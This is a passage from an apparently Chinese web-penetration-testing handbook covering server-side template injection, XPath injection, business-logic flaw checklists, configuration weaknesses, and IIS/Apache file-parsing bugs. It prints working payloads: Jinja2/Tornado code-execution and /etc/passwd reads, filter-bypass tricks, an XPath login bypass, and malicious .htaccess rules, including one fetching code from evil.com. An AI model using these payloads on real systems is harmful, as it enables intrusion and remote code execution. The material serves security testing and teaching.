<div class="section" id="id6">
<h4>参考链接<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://www.w3school.com.cn/xml/">XML教程</a></li>
<li><a class="reference external" href="https://security.tencent.com/index.php/blog/msg/69">未知攻焉知防 XXE漏洞攻防</a></li>
<li><a class="reference external" href="http://www.freebuf.com/articles/web/97833.html">XXE 攻击笔记分享</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a></li>
</ul>
</div>
</div>
<span id="document-vuln/ssti"></span><div class="section" id="id1">
<h3>模版注入<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>
</div>
<div class="section" id="id3">
<h4>测试方法<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>确定使用的引擎</li>
<li>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</li>
<li>需找攻击面，尝试攻击</li>
</ul>
</div>
<div class="section" id="id4">
<h4>测试用例<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>简单的数学表达式，<code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">7+7</span> <span class="pre">}}</span> <span class="pre">=&gt;</span> <span class="pre">14</span></code></li>
<li>字符串表达式 <code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">&quot;ajin&quot;</span> <span class="pre">}}</span> <span class="pre">=&gt;</span> <span class="pre">ajin</span></code></li>
<li><dl class="first docutils">
<dt>Ruby</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">&lt;%=</span> <span class="pre">7</span> <span class="pre">*</span> <span class="pre">7</span> <span class="pre">%&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;%=</span> <span class="pre">File.open('/etc/passwd').read</span> <span class="pre">%&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Java</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">${7*7}</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Twig</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">{{7*7}}</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Smarty</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">{php}echo</span> <span class="pre">`id`;{/php}</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>AngularJS</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">$eval('1+1')</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Tornado</dt>
<dd><ul class="first last">
<li>引用模块 <code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">import</span> <span class="pre">module</span> <span class="pre">%}</span></code></li>
<li>=&gt; <code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">import</span> <span class="pre">os</span> <span class="pre">%}{{</span> <span class="pre">os.popen(&quot;whoami&quot;).read()</span> <span class="pre">}}</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Flask/Jinja2</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">config</span> <span class="pre">}}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">config.items()</span> <span class="pre">}}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{{get_flashed_messages.__globals__['current_app'].config}}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{{''.__class__.__mro__[-1].__subclasses__()}}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">url_for.__globals__['__builtins__'].__import__('os').system('ls')</span> <span class="pre">}}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()</span> <span class="pre">}}</span></code></li>
<li></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Django</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">{{</span> <span class="pre">request</span> <span class="pre">}}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">debug</span> <span class="pre">%}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">load</span> <span class="pre">module</span> <span class="pre">%}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">include</span> <span class="pre">&quot;x.html&quot;</span> <span class="pre">%}</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">{%</span> <span class="pre">extends</span> <span class="pre">&quot;x.html&quot;</span> <span class="pre">%}</span></code></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h4>目标<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>创建对象</li>
<li>文件读写</li>
<li>远程文件包含</li>
<li>信息泄漏</li>
<li>提权</li>
</ul>
</div>
<div class="section" id="id6">
<h4>相关属性<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<div class="section" id="class">
<h5><code class="docutils literal notranslate"><span class="pre">__class__</span></code><a class="headerlink" href="#class" title="永久链接至标题">¶</a></h5>
<p>python中的新式类（即显示继承object对象的类）都有一个属性 <code class="docutils literal notranslate"><span class="pre">__class__</span></code> 用于获取当前实例对应的类，例如 <code class="docutils literal notranslate"><span class="pre">&quot;&quot;.__class__</span></code> 就可以获取到字符串实例对应的类</p>
</div>
<div class="section" id="mro">
<h5><code class="docutils literal notranslate"><span class="pre">__mro__</span></code><a class="headerlink" href="#mro" title="永久链接至标题">¶</a></h5>
<p>python中类对象的 <code class="docutils literal notranslate"><span class="pre">__mro__</span></code> 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</p>
</div>
<div class="section" id="globals">
<h5><code class="docutils literal notranslate"><span class="pre">__globals__</span></code><a class="headerlink" href="#globals" title="永久链接至标题">¶</a></h5>
<p>保存了函数所有的所有全局变量，在利用中，可以使用 <code class="docutils literal notranslate"><span class="pre">__init__</span></code> 获取对象的函数，并通过 <code class="docutils literal notranslate"><span class="pre">__globals__</span></code> 获取 <code class="docutils literal notranslate"><span class="pre">file</span></code> <code class="docutils literal notranslate"><span class="pre">os</span></code> 等模块以进行下一步的利用</p>
</div>
<div class="section" id="subclasses">
<h5><code class="docutils literal notranslate"><span class="pre">__subclasses__()</span></code><a class="headerlink" href="#subclasses" title="永久链接至标题">¶</a></h5>
<p>python的新式类都保留了它所有的子类的引用，<code class="docutils literal notranslate"><span class="pre">__subclasses__()</span></code> 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p>
<p>因为python中的类都是继承object的，所以只要调用object类对象的 <code class="docutils literal notranslate"><span class="pre">__subclasses__()</span></code> 方法就可以获取想要的类的对象。</p>
</div>
</div>
<div class="section" id="payload">
<h4>常见Payload<a class="headerlink" href="#payload" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(&quot;os&quot;).popen(&quot;ls</span> <span class="pre">/&quot;).read()'</span> <span class="pre">)</span></code></li>
</ul>
</div>
<div class="section" id="id7">
<h4>绕过技巧<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<div class="section" id="id8">
<h5>字符串拼接<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]</span></code></p>
</div>
<div class="section" id="id9">
<h5>使用参数绕过<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;clas&#39;</span><span class="p">:</span> <span class="s1">&#39;__class__&#39;</span><span class="p">,</span>
    <span class="s1">&#39;mr&#39;</span><span class="p">:</span> <span class="s1">&#39;__mro__&#39;</span><span class="p">,</span>
    <span class="s1">&#39;subc&#39;</span><span class="p">:</span> <span class="s1">&#39;__subclasses__&#39;</span>
<span class="p">}</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;data&quot;</span><span class="p">:</span> <span class="s2">&quot;{{&#39;&#39;[request.args.clas][request.args.mr][1][request.args.subc]()}}&quot;</span>
<span class="p">}</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id10">
<h4>参考链接<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://zhuanlan.zhihu.com/p/28823933">服务端模版注入</a></li>
<li><a class="reference external" href="http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/">用Python特性任意代码执行</a></li>
</ul>
</div>
</div>
<span id="document-vuln/xpath"></span><div class="section" id="xpath">
<h3>Xpath注入<a class="headerlink" href="#xpath" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>Xpath定义<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>XPath注入攻击是指利用XPath解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。</p>
</div>
<div class="section" id="id2">
<h4>Xpath注入攻击原理<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<blockquote>
<div>XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。</div></blockquote>
<p>在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名 （username）和密码（password）的结果来进行授权访问，</p>
<p>例存在user.xml文件如下：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">users</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">firstname</span><span class="o">&gt;</span><span class="n">Ben</span><span class="o">&lt;/</span><span class="n">firstname</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">lastname</span><span class="o">&gt;</span><span class="n">Elmore</span><span class="o">&lt;/</span><span class="n">lastname</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">loginID</span><span class="o">&gt;</span><span class="n">abc</span><span class="o">&lt;/</span><span class="n">loginID</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="n">test123</span><span class="o">&lt;/</span><span class="n">password</span><span class="o">&gt;</span>
     <span class="o">&lt;/</span><span class="n">user</span><span class="o">&gt;</span>
     <span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">firstname</span><span class="o">&gt;</span><span class="n">Shlomy</span><span class="o">&lt;/</span><span class="n">firstname</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">lastname</span><span class="o">&gt;</span><span class="n">Gantz</span><span class="o">&lt;/</span><span class="n">lastname</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">loginID</span><span class="o">&gt;</span><span class="n">xyz</span><span class="o">&lt;/</span><span class="n">loginID</span><span class="o">&gt;</span>
         <span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="mi">123</span><span class="n">test</span><span class="o">&lt;/</span><span class="n">password</span><span class="o">&gt;</span>
     <span class="o">&lt;/</span><span class="n">user</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>则在XPath中其典型的查询语句为： <code class="docutils literal notranslate"><span class="pre">//users/user[loginID/text()='xyz'and</span> <span class="pre">password/text()='123test']</span></code></p>
<p>但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 <code class="docutils literal notranslate"><span class="pre">loginID</span> <span class="pre">=</span> <span class="pre">'xyz'</span> <span class="pre">和</span> <span class="pre">password</span> <span class="pre">=</span> <span class="pre">'123test'</span></code> ，则该查询语句将返回 true。但如果用户传入类似 <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">or</span> <span class="pre">1=1</span> <span class="pre">or</span> <span class="pre">''='</span></code> 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：<code class="docutils literal notranslate"><span class="pre">//users/user[loginID/text()=''or</span> <span class="pre">1=1</span> <span class="pre">or</span> <span class="pre">''=''</span> <span class="pre">and</span> <span class="pre">password/text()=''</span> <span class="pre">or</span> <span class="pre">1=1</span> <span class="pre">or</span> <span class="pre">''='']</span></code></p>
<p>这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。</p>
</div>
</div>
<span id="document-vuln/logic"></span><div class="section" id="id1">
<h3>逻辑漏洞 / 业务漏洞<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。</p>
<p>在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。</p>
</div>
<div class="section" id="id3">
<h4>安装逻辑<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>查看能否绕过判定重新安装</li>
<li>查看能否利用安装文件获取信息</li>
<li>看能否利用更新功能获取信息</li>
</ul>
</div>
<div class="section" id="id4">
<h4>交易<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="id5">
<h5>购买<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>修改支付的价格</li>
<li>修改支付的状态</li>
<li>修改购买数量为负数</li>
<li>修改金额为负数</li>
<li>重放成功的请求</li>
<li>并发数据库锁处理不当</li>
</ul>
</div>
<div class="section" id="id6">
<h5>业务风控<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>刷优惠券</li>
<li>套现</li>
</ul>
</div>
</div>
<div class="section" id="id7">
<h4>账户<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<div class="section" id="id8">
<h5>注册<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>覆盖注册</li>
<li>尝试重复用户名</li>
<li>注册遍历猜解已有账号</li>
</ul>
</div>
<div class="section" id="id9">
<h5>密码<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>密码未使用哈希算法保存</li>
</ul>
</div>
<div class="section" id="id10">
<h5>邮箱用户名<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>前后空格</li>
<li>大小写变换</li>
</ul>
</div>
<div class="section" id="cookie">
<h5>Cookie<a class="headerlink" href="#cookie" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>包含敏感信息</li>
<li>未验证合法性可伪造</li>
</ul>
</div>
<div class="section" id="id11">
<h5>手机号用户名<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>前后空格</li>
<li>+86</li>
</ul>
</div>
<div class="section" id="id12">
<h5>登录<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>撞库</li>
<li>账号劫持</li>
<li>恶意尝试帐号密码锁死账户</li>
</ul>
</div>
<div class="section" id="id13">
<h5>找回密码<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>重置任意用户密码</li>
<li>密码重置后新密码在返回包中</li>
<li>Token验证逻辑在前端</li>
<li>X-Forwarded-Host处理不正确</li>
</ul>
</div>
<div class="section" id="id14">
<h5>修改密码<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>越权修改密码</li>
<li>修改密码没有旧密码验证</li>
</ul>
</div>
<div class="section" id="id15">
<h5>申诉<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>身份伪造</li>
<li>逻辑绕过</li>
</ul>
</div>
<div class="section" id="id16">
<h5>更新<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>ORM更新操作不当可更新任意字段</li>
<li>权限限制不当可以越权修改</li>
</ul>
</div>
<div class="section" id="id17">
<h5>信息查询<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>权限限制不当可以越权查询</li>
<li>用户信息ID可以猜测导致遍历</li>
</ul>
</div>
</div>
<div class="section" id="fa">
<h4>2FA<a class="headerlink" href="#fa" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>重置密码后自动登录没有2FA</li>
<li>OAuth登录没有启用2FA</li>
<li>2FA可爆破</li>
<li>2FA有条件竞争</li>
<li>修改返回值绕过</li>
<li>激活链接没有启用2FA</li>
<li>可通过CSRF禁用2FA</li>
</ul>
</div>
<div class="section" id="id18">
<h4>验证码<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>验证码可重用</li>
<li>验证码可预测</li>
<li>验证码强度不够</li>
<li>验证码无时间限制或者失效时间长</li>
<li>验证码无猜测次数限制</li>
<li>验证码传递特殊的参数或不传递参数绕过</li>
<li>验证码可从返回包中直接获取</li>
<li>验证码不刷新或无效</li>
<li>验证码数量有限</li>
<li>验证码在数据包中返回</li>
<li>修改Cookie绕过</li>
<li>修改返回包绕过</li>
<li>验证码在客户端生成或校验</li>
<li>验证码可OCR或使用机器学习识别</li>
<li>验证码用于手机短信/邮箱轰炸</li>
</ul>
</div>
<div class="section" id="session">
<h4>Session<a class="headerlink" href="#session" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Session机制</li>
<li>Session猜测 / 爆破</li>
<li>Session伪造</li>
<li>Session泄漏</li>
<li>Session Fixation</li>
</ul>
</div>
<div class="section" id="id19">
<h4>越权<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>未授权访问</li>
<li><dl class="first docutils">
<dt>水平越权</dt>
<dd><ul class="first last">
<li>攻击者可以访问与他拥有相同权限的用户的资源</li>
<li>权限类型不变，ID改变</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>垂直越权</dt>
<dd><ul class="first last">
<li>低级别攻击者可以访问高级别用户的资源</li>
<li>权限ID不变，类型改变</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>交叉越权</dt>
<dd><ul class="first last">
<li>权限ID改变，类型改变</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id20">
<h4>随机数安全<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>使用不安全的随机数发生器</li>
<li>使用时间等易猜解的因素作为随机数种子</li>
</ul>
</div>
<div class="section" id="id21">
<h4>其他<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>用户/订单/优惠券等ID生成有规律，可枚举</li>
<li>接口无权限、次数限制</li>
<li>加密算法实现误用</li>
<li>执行顺序</li>
<li>敏感信息泄露</li>
</ul>
</div>
<div class="section" id="id22">
<h4>参考链接<a class="headerlink" href="#id22" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://blog.csdn.net/mylutte/article/details/50819146#10006-weixin-1-52626-6b3bffd01fdde4900130bc5a2751b6d1">水平越权漏洞及其解决方案</a></li>
<li><a class="reference external" href="https://xz.aliyun.com/t/6029">细说验证码安全 测试思路大梳理</a></li>
</ul>
</div>
</div>
<span id="document-vuln/config"></span><div class="section" id="id1">
<h3>配置安全<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<ul class="simple">
<li><dl class="first docutils">
<dt>弱密码</dt>
<dd><ul class="first last">
<li>位数过低</li>
<li>字符集小</li>
<li>为常用密码</li>
<li><dl class="first docutils">
<dt>个人信息相关</dt>
<dd><ul class="first last">
<li>手机号</li>
<li>生日</li>
<li>姓名</li>
<li>用户名</li>
</ul>
</dd>
</dl>
</li>
<li>使用键盘模式做密码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>敏感文件泄漏</dt>
<dd><ul class="first last">
<li>.git</li>
<li>.svn</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>数据库</dt>
<dd><ul class="first last">
<li>Mongo/Redis等数据库无密码且没有限制访问</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>加密体系</dt>
<dd><ul class="first last">
<li>在客户端存储私钥</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>三方库/软件</dt>
<dd><ul class="first last">
<li>公开漏洞后没有及时更新</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<span id="document-vuln/middleware/index"></span><div class="section" id="id1">
<h3>中间件<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-vuln/middleware/iis"></span><div class="section" id="iis">
<h4>IIS<a class="headerlink" href="#iis" title="永久链接至标题">¶</a></h4>
<div class="section" id="iis-6-0">
<h5>IIS 6.0<a class="headerlink" href="#iis-6-0" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>后缀解析 <code class="docutils literal notranslate"><span class="pre">/xx.asp;.jpg</span></code></dt>
<dd><ul class="first last">
<li>服务器默认不解析 <code class="docutils literal notranslate"><span class="pre">;</span></code> 号及其后面的内容，相当于截断。</li>
</ul>
</dd>
</dl>
</li>
<li>目录解析 <code class="docutils literal notranslate"><span class="pre">/xx.asp/xx.jpg</span></code> (xx.asp目录下任意解析)</li>
<li>默认解析 <code class="docutils literal notranslate"><span class="pre">xx.asa</span></code> <code class="docutils literal notranslate"><span class="pre">xx.cer</span></code> <code class="docutils literal notranslate"><span class="pre">xx.cdx</span></code></li>
<li>PROPFIND 栈溢出漏洞</li>
<li>RCE CVE-2017-7269</li>
</ul>
</div>
<div class="section" id="iis-7-0-7-5-nginx-0-8-37">
<h5>IIS 7.0-7.5 / Nginx &lt;= 0.8.37<a class="headerlink" href="#iis-7-0-7-5-nginx-0-8-37" title="永久链接至标题">¶</a></h5>
<p>在Fast-CGI开启状态下，在文件路径后加上 <code class="docutils literal notranslate"><span class="pre">/xx.php</span></code> ，即 <code class="docutils literal notranslate"><span class="pre">xx.jpg/xx.php</span></code> 会被解析为php文件。</p>
</div>
<div class="section" id="put">
<h5>PUT漏洞<a class="headerlink" href="#put" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>开启WebDAV</li>
<li>拥有来宾用户，且来宾用户拥有上传权限</li>
<li>可任意文件上传</li>
</ul>
</div>
<div class="section" id="windows">
<h5>Windows特性<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h5>
<p>Windows不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用 <code class="docutils literal notranslate"><span class="pre">xx.php[空格]</span></code> ， <code class="docutils literal notranslate"><span class="pre">xx.php.</span></code>， <code class="docutils literal notranslate"><span class="pre">xx.php/</span></code>， <code class="docutils literal notranslate"><span class="pre">xx.php::$DATA</span></code> 上传脚本文件。</p>
</div>
<div class="section" id="id1">
<h5>文件名猜解<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>在支持NTFS 8.3文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p>
<ul class="simple">
<li>文件名为原文件名前6位字符加上 <code class="docutils literal notranslate"><span class="pre">~1</span></code> ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。</li>
<li>后缀名不超过3位，超过部分会被截断</li>
<li>所有小写字母均转换成大写的字母</li>
<li>文件名后缀长度大于等于4或者总长度大于等于9时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</li>
</ul>
<p>IIS 8.0之前的版本支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种，需要安装ASP.NET。而IIS 8.0之后的版本只能通过OPTIONS和TRACE方法猜测成功，但是没有ASP.NET的限制。</p>
<p>这种方法的局限性在于：</p>
<ul class="simple">
<li>文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报</li>
<li>不支持中文文件名</li>
</ul>
<p>这种方法可以通过命令 <code class="docutils literal notranslate"><span class="pre">fsutil</span> <span class="pre">behavior</span> <span class="pre">set</span> <span class="pre">disable8dot3</span> <span class="pre">1</span></code> 关闭NTFS 8.3文件格式的支持来修复。</p>
</div>
<div class="section" id="id2">
<h5>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://xz.aliyun.com/t/2318">利用Windows特性高效猜测目录</a></li>
<li><a class="reference external" href="https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/">Uploading web.config for Fun and Profit 2</a></li>
</ul>
</div>
</div>
<span id="document-vuln/middleware/apache"></span><div class="section" id="apache">
<h4>Apache<a class="headerlink" href="#apache" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>后缀解析<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">test.php.x1.x2.x3</span></code> （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p>
</div>
<div class="section" id="htaccess">
<h5>.htaccess<a class="headerlink" href="#htaccess" title="永久链接至标题">¶</a></h5>
<p>当AllowOverride被启用时，上传启用解析规则的.htaccess</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">AddType</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">httpd</span><span class="o">-</span><span class="n">php</span> <span class="o">.</span><span class="n">jpg</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php_value</span> <span class="n">auto_append_file</span> <span class="o">.</span><span class="n">htaccess</span>
<span class="c1">#&lt;?php phpinfo();</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Options</span> <span class="n">ExecCGI</span>
<span class="n">AddHandler</span> <span class="n">cgi</span><span class="o">-</span><span class="n">script</span> <span class="o">.</span><span class="n">jpg</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Options</span> <span class="o">+</span><span class="n">ExecCGI</span>
<span class="n">AddHandler</span> <span class="n">fcgid</span><span class="o">-</span><span class="n">script</span> <span class="o">.</span><span class="n">gif</span>
<span class="n">FcgidWrapper</span> <span class="s2">&quot;/bin/bash&quot;</span> <span class="o">.</span><span class="n">gif</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">php_flag</span> <span class="n">allow_url_include</span> <span class="mi">1</span>
<span class="n">php_value</span> <span class="n">auto_append_file</span> <span class="n">data</span><span class="p">:</span><span class="o">//</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">;</span><span class="n">base64</span><span class="p">,</span><span class="n">PD9waHAgcGhwaW5mbygpOw</span><span class="o">==</span>
<span class="c1">#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B</span>
<span class="c1">#php_value auto_append_file https://evil.com/evil-code.txt</span>
</pre></div>
</div>
</div>
<div class="section" id="id2">
<h5>目录遍历<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>配置 <code class="docutils literal notranslate"><span class="pre">Options</span> <span class="pre">+Indexes</span></code> 时Apache存在目录遍历漏洞。</p>
</div>
<div class="section" id="cve-2017-15715">
<h5>CVE-2017-15715<a class="headerlink" href="#cve-2017-15715" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">%0A</span></code> 绕过上传黑名单。</p>
